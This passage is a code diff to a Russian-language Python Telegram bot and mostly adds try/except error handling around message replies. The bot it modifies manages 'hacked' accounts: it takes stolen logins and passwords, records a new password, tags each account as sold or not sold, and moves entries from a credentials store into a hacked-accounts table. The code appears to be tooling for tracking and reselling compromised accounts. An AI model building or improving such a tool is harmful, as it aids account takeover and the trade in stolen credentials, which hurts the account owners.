+            print(f"Ошибка отправки ответа на /addcred для {chat_id}: {e}")
     else:
         print("Ошибка при добавлении учетных данных")
-        bot.reply_to(message, "❌ Ошибка при добавлении!")
+        try:
+            bot.reply_to(message, "❌ Ошибка при добавлении!")
+        except Exception as e:
+            print(f"Ошибка отправки ответа на /addcred для {chat_id}: {e}")
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("hack_") or call.data == "add_hacked" or call.data.startswith("hack_cred_"))
 def handle_hack_callback(call):
@@ -868,10 +1004,13 @@ def handle_hack_callback(call):
     
     if call.data == "add_hacked":
         print(f"Запрос на добавление нового взломанного аккаунта от {chat_id}")
-        msg = bot.edit_message_text("📝 Введите логин и пароль:\nФормат: `<логин> <пароль>`\nПример: `test test123`",
-                                  chat_id, call.message.message_id, parse_mode='Markdown')
-        bot.answer_callback_query(call.id)
-        pending_hacked[chat_id] = {'step': 'awaiting_input', 'message_id': msg.message_id}
+        try:
+            msg = bot.edit_message_text("📝 Введите логин и пароль:\nФормат: `<логин> <пароль>`\nПример: `test test123`",
+                                      chat_id, call.message.message_id, parse_mode='Markdown')
+            bot.answer_callback_query(call.id)
+            pending_hacked[chat_id] = {'step': 'awaiting_input', 'message_id': msg.message_id}
+        except Exception as e:
+            print(f"Ошибка обработки callback add_hacked для {chat_id}: {e}")
         return
     
     if call.data.startswith("hack_cred_"):
@@ -894,8 +1033,11 @@ def handle_hack_callback(call):
             types.InlineKeyboardButton("📦 Не продан", callback_data=f"hack_{login}_{password}_Не продан_{linked_chat_id}")
         )
         print(f"Редактирование сообщения для {chat_id} с выбором статуса")
-        bot.edit_message_text(f"🔓 Укажите статус для `{login}`:", chat_id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')
-        bot.answer_callback_query(call.id)
+        try:
+            bot.edit_message_text(f"🔓 Укажите статус для `{login}`:", chat_id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')
+            bot.answer_callback_query(call.id)
+        except Exception as e:
+            print(f"Ошибка редактирования сообщения для hack_cred для {chat_id}: {e}")
         return
     
     if call.data.startswith("hack_"):
@@ -911,19 +1053,22 @@ def handle_hack_callback(call):
             bot.answer_callback_query(call.id, "❌ Пользователь не найден")
             return
         
-        msg = bot.edit_message_text(f"🔓 Аккаунт `{login}` со статусом '{sold_status}'.\nВведите новый пароль:",
-                                  chat_id, call.message.message_id, parse_mode='Markdown')
-        bot.answer_callback_query(call.id)
-        pending_hacked[chat_id] = {
-            'login': login,
-            'old_password': old_password,
-            'sold_status': sold_status,
-            'linked_chat_id': linked_chat_id,
-            'message_id': msg.message_id,
-            'step': 'awaiting_new_password',
-            'from_passwords': call.data.startswith("hack_cred_")
-        }
-        print(f"Ожидание нового пароля для {login} от {chat_id}")
+        try:
+            msg = bot.edit_message_text(f"🔓 Аккаунт `{login}` со статусом '{sold_status}'.\nВведите новый пароль:",
+                                      chat_id, call.message.message_id, parse_mode='Markdown')
+            bot.answer_callback_query(call.id)
+            pending_hacked[chat_id] = {
+                'login': login,
+                'old_password': old_password,
+                'sold_status': sold_status,
+                'linked_chat_id': linked_chat_id,
+                'message_id': msg.message_id,
+                'step': 'awaiting_new_password',
+                'from_passwords': call.data.startswith("hack_cred_")
+            }
+            print(f"Ожидание нового пароля для {login} от {chat_id}")
+        except Exception as e:
+            print(f"Ошибка обработки callback hack для {chat_id}: {e}")
 
 @bot.message_handler(func=lambda message: str(message.chat.id) in pending_hacked)
 def handle_hacked_input(message):
@@ -940,7 +1085,10 @@ def handle_hacked_input(message):
         args = message.text.strip().split()
         if len(args) != 2:
             print("Неверный формат ввода для добавления аккаунта")
-            bot.reply_to(message, "❌ Формат: `<логин> <пароль>`\nПример: `test test123`", parse_mode='Markdown')
+            try:
+                bot.reply_to(message, "❌ Формат: `<логин> <пароль>`\nПример: `test test123`", parse_mode='Markdown')
+            except Exception as e:
+                print(f"Ошибка отправки ответа для awaiting_input для {chat_id}: {e}")
             return
         login, password = args[0], args[1]
         markup = types.InlineKeyboardMarkup()
@@ -949,8 +1097,11 @@ def handle_hacked_input(message):
             types.InlineKeyboardButton("📦 Не продан", callback_data=f"hack_{login}_{password}_Не продан_{chat_id}")
         )
         print(f"Запрос статуса для {login} от {chat_id}")
-        bot.reply_to(message, f"🔓 Укажите статус для `{login}`:", reply_markup=markup, parse_mode='Markdown')
-        del pending_hacked[chat_id]
+        try:
+            bot.reply_to(message, f"🔓 Укажите статус для `{login}`:", reply_markup=markup, parse_mode='Markdown')
+            del pending_hacked[chat_id]
+        except Exception as e:
+            print(f"Ошибка отправки запроса статуса для awaiting_input для {chat_id}: {e}")
     
     elif step == 'awaiting_new_password':
         new_password = message.text.strip()
@@ -962,15 +1113,21 @@ def handle_hacked_input(message):
         
         if save_hacked_account(login, new_password, prefix, sold_status, linked_chat_id):
             if data.get('from_passwords'):
-                delete_credentials(login)  # Удаляем из credentials, если из /passwords
+                delete_credentials(login)
             print(f"Аккаунт {login} добавлен в hacked с новым паролем")
-            bot.reply_to(message, f"✅ Аккаунт `{login}` успешно добавлен в взломанные!\n"
-                                f"🔒 Новый пароль: `{new_password}`\n"
-                                f"💰 Статус: {sold_status}\n"
-                                f"👑 Префикс: {prefix}", parse_mode='Markdown')
+            try:
+                bot.reply_to(message, f"✅ Аккаунт `{login}` успешно добавлен в взломанные!\n"
+                                    f"🔒 Новый пароль: `{new_password}`\n"
+                                    f"💰 Статус: {sold_status}\n"
+                                    f"👑 Префикс: {prefix}", parse_mode='Markdown')
+            except Exception as e:
+                print(f"Ошибка отправки подтверждения для awaiting_new_password для {chat_id}: {e}")
         else:
             print(f"Ошибка при добавлении аккаунта {login}")
-            bot.reply_to(message, "❌ Ошибка при добавлении аккаунта!")
+            try:
+                bot.reply_to(message, "❌ Ошибка при добавлении аккаунта!")
+            except Exception as e:
+                print(f"Ошибка отправки ошибки для awaiting_new_password для {chat_id}: {e}")
         del pending_hacked[chat_id]
         print(f"Процесс взлома завершен для {chat_id}")
 
@@ -983,9 +1140,12 @@ def handle_delete_callback(call):
         login = call.data[len("delete_cred_"):]
         if delete_credentials(login):
             print(f"Логин {login} успешно удален из credentials")
-            bot.edit_message_text(f"✅ Логин `{login}` успешно удален из списка паролей!", 
-                                 chat_id, call.message.message_id, parse_mode='Markdown')
-            bot.answer_callback_query(call.id)
+            try:
+                bot.edit_message_text(f"✅ Логин `{login}` успешно удален из списка паролей!", 
+                                     chat_id, call.message.message_id, parse_mode='Markdown')
+                bot.answer_callback_query(call.id)
+            except Exception as e:
+                print(f"Ошибка редактирования сообщения для delete_cred для {chat_id}: {e}")
         else:
             print(f"Ошибка при удалении логина {login} из credentials")
             bot.answer_callback_query(call.id, "❌ Ошибка при удалении!")
@@ -994,9 +1154,12 @@ def handle_delete_callback(call):
         login = call.data[len("delete_hacked_"):]
         if delete_hacked_account(login):
             print(f"Логин {login} успешно удален из hacked")
-            bot.edit_message_text(f"✅ Логин `{login}` удален из списка взломанных!", 
-                                 chat_id, call.message.message_id, parse_mode='Markdown')
-            bot.answer_callback_query(call.id)
+            try:
+                bot.edit_message_text(f"✅ Логин `{login}` удален из списка взломанных!", 
+                                     chat_id, call.message.message_id, parse_mode='Markdown')
+                bot.answer_callback_query(call.id)
+            except Exception as e:
+                print(f"Ошибка редактирования сообщения для delete_hacked для {chat_id}: {e}")
         else:
             print(f"Ошибка при удалении логина {login} из hacked")
             bot.answer_callback_query(call.id, "❌ Ошибка при удалении!")
@@ -1011,16 +1174,18 @@ def unknown_command(message):
                "/getchatid — ваш ID\n" \
                "/support — сообщить об ошибке\n" \
                "Для полного списка используйте /menu"
-    bot.reply_to(message, response, parse_mode='Markdown')
-    print(f"Отправлен ответ на неизвестную команду для {chat_id}")
+    try:
+        bot.reply_to(message, response, parse_mode='Markdown')
+        print(f"Отправлен ответ на неизвестную команду для {chat_id}")
+    except Exception as e:
+        print(f"Ошибка отправки ответа на неизвестную команду для {chat_id}: {e}")
 
-# === Инициализация и запуск ===
 print("Инициализация базы данных при запуске")
 init_db()
 
 if __name__ == "__main__":
     print("Запуск бота")
-    threading.Thread(target=keep_alive, daemon=True).start()  # Запускаем keep_alive в отдельном потоке
-    port = int(os.environ.get('PORT', 10000))  # Получаем порт от Render или используем 10000
+    threading.Thread(target=keep_alive, daemon=True).start()
+    port = int(os.environ.get('PORT', 10000))
     print(f"Запуск Flask на порту {port}")
-    app.run(host='0.0.0.0', port=port)  # Запускаем Flask приложение
+    app.run(host='0.0.0.0', port=port)
